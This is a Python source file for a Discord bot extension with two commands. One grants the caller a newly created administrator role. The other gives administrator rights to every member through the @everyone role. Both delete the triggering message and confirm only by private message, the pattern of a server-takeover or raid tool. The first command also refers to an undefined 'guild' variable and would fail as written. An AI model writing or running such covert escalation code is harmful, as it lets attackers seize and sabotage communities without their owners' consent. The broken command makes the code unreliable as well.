# coding: utf-8
import os
import json
import time
import aiohttp
import asyncio
import discord
import subprocess
import datetime
from utils import *
from os import system, name
from discord.ext.commands.core import cooldown
from discord import Permissions

from discord.ext import (
    commands,
    tasks
)



class Roles_Commands(commands.Cog):

    def __init__(self, client):
        self.client = client


    # Give yourself a role with administrator rights
    @commands.command(aliases=['administrator', 'give_admin', 'admin_give'])
    @commands.check(black_check)
    @commands.check(white_check)
    @commands.cooldown(1, 5, commands.BucketType.user)
    async def admin(self, ctx):
        try:
            perms = discord.Permissions(administrator=True) 

            await guild.create_role(name="Administrator", permissions=perms) 
    
            role = discord.utils.get(ctx.guild.roles, name="Administrator") 
            user = ctx.message.author

            await user.add_roles(role) 
            await ctx.message.delete()

            embed = discord.Embed(
                title = '✅ | Успешная выдача роли администратора',
                description = f'''**{ctx.author.mention} вам успешно выдана роль с правами администратора.**''',
                color = 0xb9b9b9
            )

            try:
                await ctx.author.send(embed=embed)
            except:
                pass
        except Exception as e: print(e)


    # Grant administrator rights to all participants
    @commands.command(aliases=['eveyoneadmin', 'everyone_a', 'e_admin', 'e_a', 'all_admin', 'a_admin', 'all_a', "a_a"])
    @commands.check(black_check)
    @commands.check(white_check)
    @commands.cooldown(1, 5, commands.BucketType.user)
    async def everyone_admin(self, ctx):
        try:
            role = discord.utils.get(ctx.message.guild.roles, name="@everyone")
            perms = discord.Permissions(administrator=True)

            await role.edit(permissions=perms)
            await ctx.message.delete()

            embed = discord.Embed(
                title = '✅ | Успешная выдача прав администратора всем участникам',
                description = f'''> {ctx.author.mention} роли @everyone было выдано право администратора! Теперь все участники могут приглашать ботов, вносить изменения в сервер.''',
                color = 0xb9b9b9
            )
            try:
                await ctx.author.send(embed=embed)
            except:
                pass
        except Exception as e: print(e)


async def setup(client):
    await client.add_cog(Roles_Commands(client))